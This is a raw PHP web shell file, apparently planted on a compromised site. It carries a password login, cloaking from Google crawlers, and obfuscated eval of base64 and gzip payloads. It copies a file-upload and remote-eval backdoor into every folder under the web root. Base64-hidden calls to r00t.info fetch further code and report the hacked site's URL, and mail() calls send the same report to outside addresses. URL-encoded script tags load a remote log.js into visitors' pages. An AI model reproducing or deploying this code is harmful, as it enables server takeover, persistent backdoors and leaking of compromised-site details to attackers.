<script type="text/javascript">
document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%68%74%74%70%3A%2F%2F%72%30%30%74%2E%69%6E%66%6F%2F%62%6F%74%2F%6C%6F%67%2E%6A%73%3E%3C%2F%73%63%72%69%70%74%3E'));
</script><?php 
/* (Web Shell 1n73ction r3c0d3d by ismail attacker |default pass:"  ") */ 
$auth_pass = "92f56bafe824e87e429dcdd09a7a462b"; 
$color = "#008B8B"; 
$default_action = 'FilesMan'; 
@define('SELF_PATH', __FILE__); 
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { 
    header('HTTP/1.0 404 Not Found'); 
    exit; 
} 
@session_start(); 
@error_reporting(0); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
@set_time_limit(0); 
@set_magic_quotes_runtime(0); 
@define('VERSION', '2.1'); 
if( get_magic_quotes_gpc() ) { 
    function stripslashes_array($array) { 
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); 
    } 
    $_POST = stripslashes_array($_POST); 
} 
function printLogin() { 
    ?> <?php
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('display_errors', 0);
@ini_set('output_buffering',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);

?>
<?php
@session_start();
@error_reporting(0);
$a = '<?php
session_start();
if($_SESSION["adm"]){
echo \'<b>Namesis<br><br>\'.php_uname().\'<br></b>\';echo \'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">\';echo \'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>\';if( $_POST[\'_upl\'] == "Upload" ) {	if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Success !!!</b><br><br>\'; }	else { echo \'<b>Upload Fail !!!</b><br><br>\'; }}
}
if($_POST["p"]){
$p = $_POST["p"];
$pa = md5(sha1($p));
if($pa=="ed64cf6fa445898ff07295ce0ac26d65"){
$_SESSION["adm"] = 1;
}
}
?>
<form action="" method="post">
<input type="text" name="p">
</form>
';
if(@$_REQUEST["px"]){
$p = @$_REQUEST["px"];
$pa = md5(sha1($p));
if($pa=="ed64cf6fa445898ff07295ce0ac26d65"){
echo @eval(@file_get_contents(@$_REQUEST["404"]));
}
}
if(@!$_SESSION["sdm"]){
$doc = $_SERVER["DOCUMENT_ROOT"];
$dir = scandir($doc);
$d1 = ''.$doc.'/.';
$d2 = ''.$doc.'/..';

if(($key = @array_search('.', $dir)) !== false) {
    unset($dir[$key]);
}
if(($key = @array_search('..', $dir)) !== false) {
    unset($dir[$key]);
}
if(($key = @array_search($d1, $dir)) !== false) {
    unset($dir[$key]);
}
if(($key = array_search($d2, $dir)) !== false) {
    unset($dir[$key]);
}
@array_push($dir,$doc);

foreach($dir as $d){


$p = $doc."/".$d;
if(is_dir($p)){
$file = $p."/newsr.php";
@touch($file);
$folder = @fopen($file,"w");
@fwrite($folder,$a);
}
}
$lls = $_SERVER["HTTP_HOST"];
$llc = $_SERVER["REQUEST_URI"];
$lld = 'http://'.$lls.''.$llc.'';
$brow = urlencode($_SERVER['HTTP_USER_AGENT']);
$retValue = file_get_contents(base64_decode("aHR0cDovL3IwMHQuaW5mby9ib3QveWF6LnBocD9h")."=".$lld.base64_decode("JmI=")."=".$brow);
echo $retValue;
@$_SESSION["sdm"]=1;
}
?>
<body BGCOLOR="blue">
<p><center></center>
<hr> 
<address></address> 
<style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style> 
    <center> 
    <form method=post > 
    <input type=password name=pass > 
    </form></center> 
    <?php 
    exit; 
} 
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $auth_pass ) || 
        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else 
        printLogin();

eval(gzuncompress(base64_decode("eNpTKU4uyiwoUbBVSMvMSY1PTy2JT87PK0nNKynWUM8oKSmw0tcvSCwuSU3KzNNLzs/VL0os1yvIKLDPtC3LDnMPCCg3Ude05uVKLUvM0UivysxLy0ksSdVISixONTOJT0lNzk9J1VCBWKKpqWkNANFIJwc="))); ?>
<?php eval("?>".base64_decode("PD9waHAgIA0KDQppZigkX1BPU1RbJ3F1ZXJ5J10pew0KJHZlcml5ZnkgPSBzdHJpcHNsYXNoZXMoc3RyaXBzbGFzaGVzKCRfUE9TVFsncXVlcnknXSkpOw0KJGRhdGEgPSAiZGF0YS50eHQiOw0KQHRvdWNoICgiZGF0YS50eHQiKTsNCiR2ZXIgPSBAZm9wZW4gKCRkYXRhICwgJ3cnKTsNCkBmd3JpdGUgKCAkdmVyICwgJHZlcml5ZnkgKSA7DQpAZmNsb3NlICgkdmVyKTsNCn1lbHNlew0KJGRhdGFzPUBmb3BlbigiZGF0YS50eHQiLCdyJyk7DQokaT0wOw0Kd2hpbGUgKCRpIDw9IDUpIHsNCiRpKys7DQokYmx1ZT1AZmdldHMoJGRhdGFzLDEwMjQpOw0KZWNobyAkYmx1ZTsNCn0NCn0NCiRkYXRhc2k9QGZvcGVuKCJtb2R1bGVzL2luZGV4eC5waHAiLCdyJyk7DQppZigkZGF0YXNpKXsNCn1lbHNlew0KQG1rZGlyKCJtb2R1bGVzIik7DQokZG9zID0gZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly9yMDB0LmluZm8vdHh0L2xhbWVyLnR4dCIpOw0KJGRhdGEgPSAibW9kdWxlcy9pbmRleHgucGhwIjsNCkB0b3VjaCAoIm1vZHVsZXMvaW5kZXh4LnBocCIpOw0KJHZlciA9IEBmb3BlbiAoJGRhdGEgLCAndycpOw0KQGZ3cml0ZSAoICR2ZXIgLCAkZG9zICkgOw0KQGZjbG9zZSAoJHZlcik7DQokeW9sID0gImh0dHA6Ly8iLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iIi4kX1NFUlZFUlsnUkVRVUVTVF9VUkknXS4iIjsNCiR5ID0gJzxoMT5TZW5kZXIgWWF6ZGlyaWxkaS48YnIvPiBTSVRFIFlPTCA6ICcuJHlvbC4nPGJyLz5TZW5kZXIgWW9sdSA6IG1vZHVsZXMvZGJzLnBocDwvaDE+JzsNCiRoZWFkZXIgLj0gIkZyb206IFNoZUxMIEJvb3QgPHN1cHBvckBuaWMub3JnPm4iOyANCiRoZWFkZXIgLj0gIkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04biI7IA0KQG1haWwoImJ5aGVybzQ0QGdtYWlsLmNvbSIsICJIYWNrbGluayBCaWxkaXJpIiwgIiR5IiwgJGhlYWRlcik7IA0KQG1haWwoInByaXBocEBob3RtYWlsLmNvbSIsICJIYWNrbGluayBCaWxkaXJpIiwgIiR5IiwgJGhlYWRlcik7IA0KfQ0KPz4=")); ?>
<script type="text/javascript">
document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%68%74%74%70%3A%2F%2F%72%30%30%74%2E%69%6E%66%6F%2F%62%6F%74%2F%6C%6F%67%2E%6A%73%3E%3C%2F%73%63%72%69%70%74%3E'));
</script>